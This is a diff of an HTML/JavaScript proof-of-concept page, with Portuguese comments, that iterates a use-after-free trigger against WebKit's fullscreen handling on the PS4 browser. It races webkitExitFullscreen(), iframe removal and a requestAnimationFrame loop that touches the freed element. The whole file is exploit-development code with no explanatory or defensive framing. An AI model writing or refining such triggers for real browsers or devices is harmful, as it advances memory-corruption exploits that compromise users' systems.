@@ -1,52 +1,77 @@
 <html>
 <body>
-<button id="run">Run V1</button>
+<button id="run">Run V3</button>
 <div id="status">Ready</div>
 <script>
 /*
-  VETOR: FullscreenManager::m_fullscreenElement raw/weak ptr
-  Remove o iframe imediatamente após webkitRequestFullscreen(),
-  antes da transição completar — tenta causar UAF no callback
-  de fullscreenchange quando o manager tenta acessar o elemento.
+  VETOR: webkitExitFullscreen() + frame destruction race
+  Entra em fullscreen em elemento filho, confirma entrada,
+  então dispara webkitExitFullscreen() e remove() simultaneamente.
+  O rAF tenta dereferenciar o elemento no próximo frame de render
+  enquanto o Document está em teardown.
 */
 
-document.addEventListener('webkitfullscreenchange', function() {
-    var el = document.webkitFullscreenElement;
-    document.getElementById("status").innerHTML =
-        "fullscreenchange: element=" + (el ? el.tagName : "null");
-    if (el) {
-        try {
-            // Acesso após possível free — crash aqui = UAF confirmado
-            var w = el.clientWidth;
-            var h = el.clientHeight;
-            document.getElementById("status").innerHTML +=
-                " w=" + w + " h=" + h;
-        } catch(e) {
-            document.getElementById("status").innerHTML += " EX:" + e;
-        }
-    }
-});
+var iframe = null;
+var rafHandle = null;
+
+function cleanup() {
+    if (rafHandle) cancelAnimationFrame(rafHandle);
+    rafHandle = null;
+}
 
 document.getElementById("run").onclick = function() {
-    var iframe = document.createElement("iframe");
-    iframe.width = 200;
-    iframe.height = 200;
+    cleanup();
+
+    iframe = document.createElement("iframe");
+    iframe.style.width = "300px";
+    iframe.style.height = "300px";
     document.body.appendChild(iframe);
 
     iframe.onload = function() {
-        var doc = iframe.contentDocument;
-        doc.open();
-        doc.write('<html><body><div id="t" style="width:100%;height:100%;background:blue"></div></body></html>');
-        doc.close();
+        var iDoc = iframe.contentDocument;
+        iDoc.open();
+        iDoc.write('<html><body style="margin:0"><div id="fs" style="width:100%;height:100%;background:purple"></div></body></html>');
+        iDoc.close();
 
-        var el = doc.documentElement;
-        el.webkitRequestFullscreen();
+        var fsEl = iDoc.getElementById("fs");
 
-        // Remove IMEDIATAMENTE — sem setTimeout
-        // FullscreenManager ainda está processando a requisição
-        iframe.remove();
+        // Fullscreen em elemento filho (não documentElement)
+        // FullscreenManager guarda ponteiro específico para este Element
+        fsEl.webkitRequestFullscreen();
 
-        document.getElementById("status").innerHTML = "iframe removed sync";
+        document.addEventListener('webkitfullscreenchange', function onEnter() {
+            if (!document.webkitFullscreenElement) return;
+            document.removeEventListener('webkitfullscreenchange', onEnter);
+
+            document.getElementById("status").innerHTML =
+                "Fullscreen ativo — disparando race";
+
+            // RAF acessa o elemento no próximo frame de render
+            // Este frame pode coincidir com o teardown do Document
+            rafHandle = requestAnimationFrame(function rafTick() {
+                try {
+                    var bounds = fsEl.getBoundingClientRect();
+                    document.getElementById("status").innerHTML +=
+                        " | rAF: bounds=" + JSON.stringify(bounds);
+                } catch(e) {
+                    document.getElementById("status").innerHTML +=
+                        " | rAF EX:" + e;
+                }
+                rafHandle = requestAnimationFrame(rafTick);
+            });
+
+            // Webkit-prefixado — único que existe no PS4
+            document.webkitExitFullscreen();
+
+            // Document teardown enquanto webkitExitFullscreen processa
+            iframe.remove();
+            iframe = null;
+
+            document.getElementById("status").innerHTML +=
+                " | exit+remove fired";
+
+            setTimeout(cleanup, 200);
+        });
     };
 };
 </script>
